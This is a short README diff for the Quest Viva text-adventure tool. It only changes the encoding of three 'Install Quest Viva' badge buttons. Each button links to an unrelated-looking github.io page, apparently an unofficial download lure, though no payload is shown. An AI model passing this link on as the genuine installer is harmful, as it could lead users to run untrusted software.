@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Quest Viva](https://img.shields.io/badge/⬇_Install_Quest%20Viva-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Quest Viva](https://img.shields.io/badge/⬇_Install_Quest+Viva-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Quest Viva is a free tool for creating text adventure and interactive fiction ga
 
 <div align="center">
 
-[![⬇ Install Quest Viva](https://img.shields.io/badge/⬇_Install_Quest%20Viva-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Quest Viva](https://img.shields.io/badge/⬇_Install_Quest+Viva-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Quest Viva is a free tool for creating text adventure and interactive fiction ga
 
 <div align="center">
 
-[![⬇ Install Quest Viva](https://img.shields.io/badge/⬇_Install_Quest%20Viva-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Quest Viva](https://img.shields.io/badge/⬇_Install_Quest+Viva-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
